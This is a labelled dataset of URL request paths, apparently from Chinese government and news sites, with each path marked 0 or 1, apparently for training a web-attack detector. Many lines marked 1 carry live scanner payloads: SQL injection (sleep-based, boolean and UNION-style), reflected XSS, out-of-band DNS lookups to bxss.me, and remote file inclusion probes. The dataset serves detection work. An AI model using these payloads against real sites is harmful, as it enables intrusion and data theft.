/****/zfwjn/1088/1093/list.html?new='.gethostbyname(lc('hitud'.'ezjnugap007eb.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(109).chr(87).chr(98).chr(65).'	1
/*****/images/dbline.gif	0
"/****/czgk/bmjs/zzqfyxt/pyxrmfy/202108/"">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e00\u53f7\u5927\u76d8\u9e21\u9910\u5385	0
/****/zdqd.php	1
"/******/5/jquery.superslide.bxss.me/t/xss.html?	1
/***/interface/url_total_pv.json.jsp?callback=jquery19107427411212339969_1640025785500	0
/****/sj1/tjxx/202104/t20210423_2797450.html	0
"/****/server/news/show/title/""><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/***/0/01/75/47/1754781_904308.jpg	0
/************/interfaces/autocomplete.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &ranksign=if(now()=sysdate(),sleep(15),0)&searchid=1&total=&tpl=16&websiteid=110105008056111	1
/**********/system/2021/10/01/013459656.shtml	0
/***/0/02/11/90/2119001_994674.jpg	0
/****/2020jnxc/yxzp/202006/t20200630_249610.html	0
/*******/ela0ak.php	1
/******/system/2016/08/27/012109284.shtml	0
/**********/system/2021/10/08/javascript:window.print()	1
"/****/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
"/***/2021/7/12/art"""" and 2*3*8=6*8 and """"h8qg""""=""""h8qg_35_234319.html"	1
/*******/gica.php	1
"/****/mtgz/2021_mtgz/202103/t20210316_271472.html"" and ""x""=""x"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9e3f\u8fd0\u5bb6\u7535\u5bb6\u653f\u670d\u52a1\u90e8	0
/****/zzxxgk/jjhzj/gyjzq/hnx_3667/202101/t20210128_177016.html	0
/zwxx_11337/****/201903/t20190311_1304751.html	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u8001\u5170\u996d\u5e84	0
/***/0/01/96/61/1966153_980877.jpg	0
/***/open?signature=f912843530cd01ef038c13b8f0369d841de6924a°¡tamp=1640035458&nonce=38660104&encrypt_type=aes&msg_signature=1e5b52d013ef34ce5c991a53460463496bb341e7	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=49095	0
/***/viewspace-172.html	0
/**************/newscenter/system/2021/12/20/013497031.shtml	0
/****/system/2021/12/08/javascript:window.print()	1
"/**/ui/widgets/hanweb/http://bxss.me/t/xss.html?	1
/************/template/jcse/110105008056111/16/images'||'/plugin/criteria/criteria.js	1
/zwxx_11337/****/202002/t20200207_1944672.html	0
"/**/ui/widgets/hanweb/placeholder/css"""" and 2*3*8=6*8 and """"ty5s""""=""""ty5s/placeholder.css"	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(6291)"">?_=1630312283968"	1
/****/zt/msss/msxw/201908/t20190814_1660055.html	0
/****/bmkx/slyj/202101/t20210106_175684.html	0
/****/xqdt/byq/202111/w020211118351071834024.jpg	0
/****/byyw/202111/t20211126_196987_wap.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u4e07\u5fe0\u6469\u6258\u8f66\u4fee\u7406\u90e8	0
/*******/qiye/b-e773941.html	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 6376=6376 and ('1'='1	1
/******/resource'||'/js/vsb_news_search_entry.js	1
/**/index.php?do=post&id=412&c=dt&a=goods&	1
/zwxx_11337/****/202112/t20211215_3224330.html	0
/****/shzr/index_1.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u901f\u79d1\u7535\u5b50\u5546\u884c	0
/****/category/guowaishichangzhunru?page=1' or 6200=3898 /*	1
/******/2015qglh/lhhx/	0
/about-southwest/******/2020-12-16/2020-12-16.html	0
/******/system/2019/12/18/javascript:void(0);	1
/****/20201221/e112730196.html	0
/**/index.php?title=acunetixtest298178&action=submit	1
/****/wlzj/202103/t20210303_http://bxss.me/t/fit.txt?.jpg.html	1
"/**/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
/****/system/2020/03/14/011940888.shtml	0
/****/dbgd/201412/w020150209568761446868.jpg	0
/****/\u02eb\ufffd\ufffd\u05ae\ufffd\ufffd	0
/****/zzxxgk/bmfgj/fggzdt/202103/t20210302_178032.html	0
/****/201909/t20190926_1757783.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5929\u8c79\u6c7d\u8f66\u8fd0\u8f93\u6709\u9650\u8d23\u4efb\u516c\u53f8\u6c38\u5b81\u52a0\u6cb9\u7ad9	0
/***/003/003/508/00300350864_c0ed4710.jpg	0
"/******/_content/download.jsp?urltype=news.downloadattachurl') and 1444=1444 	1
/wp-content/*******/login-wall-rzrsf/login_wall.php?login=cmd	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u4e2b\u4e2b\u5546\u884c	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u660c\u8fbe\u5546\u884c	0
/**********/system/2021/12/17/013496200.shtml	0
/****/tzgg/2019_tzgg/202008/t20200819_252138.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7396\u96f6\u745e\u5a1c\u7f8e\u53d1\u5e97	0
/****/tzgg/202109/t20210928_3060287_zzb.html	0
/******/public/2021/12/02/20211202_17d793b41ca_r1_1200k.mp4	0
/*****/hbnx/envilo.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u661f\u8fb0\u6c7d\u8f66\u7535\u5b50\u7535\u5668\u5e97	0
/****/zzxxgk/tjj/tjjysqgk/gkcx/list.html?new='.gethostbyname(lc('hitlg'.'aiegazpf01beb.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(72).chr(110).chr(75).'	1
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqdwbgt	0
/****/jtdt/2012jtdt/index_4.html	0
/****/zgsdt/zgs16/201612/t20161216_108631.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9526\u6da6\u6cfd\u84dd\u8393\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5723\u5730\u4e9a\u6b4c\u9152\u5427	0
/****/system/2016/10/27/012171967.shtml	0
/****/qzfwj/201801/t20180115_668740.html	0
/****/mtgz'||'/2021_mtgz/202107/t20210712_310551.html	1
/****/yqfkgszxd/fykp/javascript:void(0);	1
/**********/system/2021/12/03/013489268.shtml	0
/****/bmkx/sgsj/201902/t20190226_114786_wap.html	0
/******/zz-common.css	0
/****/zfwjn/'.gethostbyname(lc('hitod'.'avhouicb37e80.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(115).chr(68).chr(108).chr(70).'/1110/list.html	1
/****/jrnx.htm	1
/**********/system/2021/10/04/013460376.shtml	0
"/****/admin/edit.php?title="""">pt>alert(777);< /script>pt>"	1
/****/system/2018/09/14/012700097.shtml	0
/******/system/2015/03/03/011649879.shtml	0
/****************/notification/negotiate?access_token=a9d4b18e-459d-49cf-a92e-12775cecb758	0
/***/wxzcgk/201901/t20190110_1247135.html	0
/**********/system/2020/05/26/013170856.shtml	0
/*******/qiye/b-e2252624.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u56fd\u534e\u517b\u6b96\u573a	0
/***/miandg/index.php	1
/****/zycwxx/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/******/system/2010/09/27/010204926.shtml	0
/***/viewspace-894.html	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(874)</script>?_=1630311628929"	1
/****/zhengce/zfwjn/202104/p020210421603836298227.docx	0
/**********/system/2021/11/04/013475385.shtml	0
/****/wxj/spbd	0
/**********/system/2020/03/28/013127217.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5c0f\u5f20\u732a\u8089\u5e97	0
/****/20201204/e111566338.html	0
/****/category/siluyiliao	1
/**********/system/2015/12/22/011894664.shtml	0
/zwxx_11337/****/zzlist_4.html	0
/**/index.php?do=post&id=287&c=dt&a=goods&	1
/****/bmkx/sjcy/201910/t20191014_143067.html	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7b1b\u68b5\u7f8e\u53d1\u5de5\u4f5c\u5ba4	0
/*/script	1
/****/b-e1095672.html	0
/**********/system/2020/06/07/013179683.shtml	0
/**********/system/more/237000000000000/0006/237000000000000_00000653.shtml	0
/******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/zzxxgk/zrzyj/zfxxgkml_2139/gggs/202010/t20201022_173283.html	0
/****/qzfwj/201801/t20180115_668905.html	0
/******/system/2020/08/22/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5170\u745e\u7efc\u5408\u95e8\u5e02\u90e8	0
/***/col33/index.html?uid=19791&pagenum=1	0
/****/mtgz/2021_mtgz%' and 2*3*8=6*8 and 'r6zj'!='r6zj%/202103/t20210314_271326.html	1
/**/system/2021/01/21/javascript:void(0);	1
"/******/resource/js/jquery/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z.js"	1
"/**/ui/widgets/validity"""" and 2*3*8=6*8 and """"ldkp""""=""""ldkp/validity.js"	1
/******/system/2019/08/12/012948474.shtml	0
/zwxx_11337/****/202107/t20210723_2939823_zzb.html	0
"/******/system/2021/06/09'""""/><img src=javascript:alert(2432)>/013399706.shtml"	1
/zwxx_11337/****/202007/t20200722_2170067.html	0
"/*****/system/2021/01/21/013323672.shtml/""><script>alert(128)</script>"	1
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/201602/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u897f\u5b89\u9547\u70df\u9152\u767e\u8d27\u5546\u5e97	0
/***/tips/tipsloginsubmit.action	1
/****/zzxxgk/wsjkwyh/javascript:void(0)	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u51ef\u805a\u76db\u7164\u4e1a\u6709\u9650\u516c\u53f8	0
/**/system/2008/03/17/002450127.shtml	0
/************/action/to/init/1472809582362382336	0
/****/gccb/nygc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/****/files.php?folder="""">alert(777)"	1
/**********/system/2020/08/27/013234785.shtml	0
/**/system/2020/12/23/012106972.shtml	0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/*******/zwgk/czgk/bmyjs/rmtt/tw/	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7f51\u7ea6\u8f66	0
"/****/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""""><script>alert(777)</script>894ba&type=&width="	1
/**********/system/2020/06/07/013179601.shtml	0
/***********/resourceslist.html?s=zs;select sleep(5)	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u805a\u5174\u88c5\u9970\u6750\u6599\u5e97	0
"/art'""""()&%<acx><script >ierk(9255)</script>/****/10/11/art_34_242320.html"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5976\u79bd\u6e14\u4e1a\u516c\u53f8\u6e05\u771f\u996e\u6599\u5382	0
/******/qgbzdh/images/3-1.gif	0
"/******/zlhz/""><script>alert(197)</script>"	1
/**********/system/2021/06/11/013400816.shtml	0
/****/b-e592889.html	0
/****/xxgkml/qtfdxx/zdjcyjzj/202110/local	0
/**/index.php?title=acunetixtest3336a5&action=submit	1
/***/0/01/76/25/1762534_999953.jpg	0
/****/bmkx/jyj/201610/t20161025_9621.html	0
/****/xh/hd/201905/w020190507806072919476.jpg	0
"/****/zfcwhy/202107/"""" """"a"""".concat(70-3).concat(22*4).concat(119).concat(67).concat(106).concat(89) (require""""socket""""
socket.gethostbyname(""""hitox"""" """"hqlfkzjk48722.bxss.me."""")[3].to_s) """"_2938511.html"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5609\u5174\u6c7d\u914d\u90e8	0
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/201802/w020180211350980271857.gif	0
/****/jtdt/2020_jtyw/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/***/mobile_h5/waparticledetail.do?article_id=202102092048061128&contenttype=article	0
/****/202011/t20201125_256667.html	0
"/****/main/myspace/student.php?keyword=31337"""" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search"	1
/zwxx_11337/****/202006/t20200616_2138412.html	0
/****/xqldly/hfjyxz/202007	0
/*******/..	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5feb\u6377\u5e72\u6d17\u5e97	0
/*******/qiye/b-e2042892.html	0
/****/zfcwhy/202107/t20210723_http://bxss.me/t/fit.txt?.jpg.html	1
/****/bmkx/ggjyzx/	0
/********/fortunewheel/view/index.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5927\u6e2f	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u66b4\u96e8	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u8001\u59e8\u5b37\u997a\u5b50\u9986	0
"/***/2021/8/18/art_46_237432.html/<img src=""javascript:alert(6757)"">"	1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqlshwzcbj/zzqlsj/201702/t20170210_318569.html	0
/****/bmkx/sgsj/201912/t20191204_145166.html	0
/****/zjdt/czjs/gzdt/command/cmd	1
/************//xfs.bxss.me/jcse/110105008056111/16/images/plugin/hotnews/js.js	1
/***/blockdata/getsearchinfo.do?&title=\u6253\u64e6	0
/****/qyzdsx/\u83ef\u6f64\u6c34\u6ce5_files/crc_log2_cn.png	0
/******/usercenter/index?qrcode=90666&code=07109tfa19m4kc0p03ia19oa0e309tf5	0
/******/resource/js'||'/image/imagescroll.js	1
/***/blockdata/getsearchinfo.do?&title=.*\u590f\u81f3\u672a\u81f3\uff1a.*	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/zjdt/gzdt/1.htm	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6d2a\u6da6\u8282\u6c34\u6750\u6599\u90e8	0
/****/xh/hy/202104/t20210430_2807659.html	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(450)"">?_=1630311410238"	1
/***/col3910/index.html	0
/****/20211027/10643.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u5e74\u5e74\u5927\u4e30\u6536\u997c\u5b50\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e3d\u51cf\u7f8e\u7f8e\u5bb9\u7d2b\u56ed\u5e97	0
/****/whhd/201412/t20141218_47995.html	0
/*****/general/diary/new/submit.php	1
/**/product/dxzzj/201808/t20180820_194604.html	0
/**/images/logo.png	0
/***/rlzy/rcgk/bqsm/lxwm/nbfw/gjcp/gcjx/bqsm/gjcp/fzjx/gygj/gjgk/fzlc/	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5e38\u5f80\u6c7d\u8f66\u914d\u4ef6\u9500\u552e\u90e8	0
/****/20210111/e114118927.html	0
/***/0/02/03/29/2032922_860036.jpg	0
/**********/system/2020/06/26/013193252.shtml	0
/***/0/01/26/02/1260275_999669.jpg	0
/****/qyzz/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/czgk/bmyjs/zzqjcyxt/zzqgjzzqtljcy_1818/201712/t20171211_633766.html	0
/****/js/chunk-7d15097e.b2492d64.js	0
/**********/system/2020/05/11/013159186.shtml	0
/***/0/02/12/31/2123198_963493.png	0
"/**/hero_os/search?q="""" onmouseover=alert(777) ="""""	1
/**********/system/2021/12/17/013495986.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery17106271063648661788_1639980127897	0
/****/zjdt/ghby/gzdt%' and 2*3*8=6*8 and 'fdm6'!='fdm6%/1.htm	1
/******/nxrq_priv_icon1cur_4.png	0
/***********/shangpinqihuo/nongchanpin/javascript:void(0)	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u6e20\u53e3\u8001\u4faf\u5546\u5e97	0
/****/web/css/zmhd.css	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201809	0
/**********/system/2021/08/26/013440428.shtml	0
/****/xydt/2015_hydt/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/*******/qiye/b-e2068660.html	0
/****/20200602/e101744192.html	0
/******/usercenter/index?qrcode=scanqrcode&code=051zqpga1gemlc0qezga1ldu080zqpgg	0
/***/interface/daily_clickcount.json.jsp?callback=jquery1111016318357634707725_1640025525139	0
/**/ui/widgets'||'/hanweb/validity/validity.js	1
/****/czgk/bmjs/gdyx/zzqjxy/201908/	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u5473\u591a\u591a\u9ebb\u8fa3\u70eb\u51c9\u76ae\u5e97	0
/************/template/jcse/http://bxss.me/t/fit.txt/16/images/hanweb.css	1
"/*/210719/bxss.me/t/xss.html?	1
/****/gccb/qgzfgc	0
/**********/system/2020/05/18/013164414.shtml	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqnky/202008/t20200817_2188568.html	0
/****/index.php?vyhl='>alert(777)&lang=cze	1
/*******/202112/202112201646161100.html	0
"/****/gjzqq/index.html?continent=%' or 8889=8362 	1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u01bd\ufffd\ufffd&l=\ufffd\u0134\ufffd	0
/***********/wechatlist.aspx?page=5);select sleep(5)	1
/*******/qiye/b-e2295975.html	0
/****/web/search?channelid=299868&perpage=1000%') or 5218=5218 and '%'='	1
/***********/shangpinqihuo/nengyuanhuagong/index.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u7f8a\u7ba1\u5bb6\u9972\u6599\u7ecf\u9500\u90e8	0
/***/0/02/03/90/2039049_140549.jpg	0
/****/ypj/yw/202112/t20211216_3227374.html	0
/****/201909/t20190926_1757384.html	0
/******/download/downfile.jsp?classid=0&filename=e70d33e0d82f4e099c1d51b5eea1c656.doc	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' and 0641=0641 and '%%'='%	1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm	1
/****/whs/yw_1286/202111/t20211130_3172184.html	0
/**********/system/2020/05/28/013172860.shtml	0
/zwxx_11337/***/202006/t20200617_2139527.html	0
